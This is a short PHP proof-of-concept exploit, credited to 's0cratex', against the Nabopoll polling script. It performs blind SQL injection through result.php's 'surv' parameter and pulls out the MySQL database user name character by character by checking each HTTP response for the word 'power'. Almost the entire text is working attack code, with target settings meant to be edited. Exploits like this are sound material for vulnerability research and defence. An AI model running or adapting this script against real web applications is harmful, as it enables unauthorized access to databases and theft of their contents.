<?
# Nabopoll Blind SQL Injection P0C Exploit
# Download: www.nabocorp.com/nabopoll/
# coded by s0cratex
# Contact: s0cratex@hotmail.com

error_reporting(0);
ini_set("max_execution_time",0);

// just change the default values...
$srv = "localhost"; $path = "/poll"; $port = 80;
$survey = "8"; //you can verify the number entering in the site and 
viewing the results...

echo "==================================================\n";
echo "Nabopoll SQL Injection -- Proof of Concept Exploit\n";
echo "--------------------------------------------------\n\n";
echo " -- MySQL User: ";
$j = 1; $user = "";
while(!strstr($user,chr(0))){
for($x=0;$x<255;$x++){
$xpl = 
"/result.php?surv=".$survey."/**/AND/**/1=(SELECT/**/(IF((ASCII(SUBSTRING(user(),".$j.",1))=".$x."),1,0)))/*";
$cnx = fsockopen($srv,$port);
fwrite($cnx,"GET ".$path.$xpl." HTTP/1.0\r\n\r\n");
while(!feof($cnx)){ if(ereg("power",fgets($cnx))){ $user.=chr($x);echo 
chr($x); break; } }
fclose($cnx);
if ($x==255) {
die("\n Try again...");
}
}
$j++;
}
echo "\n";
?> 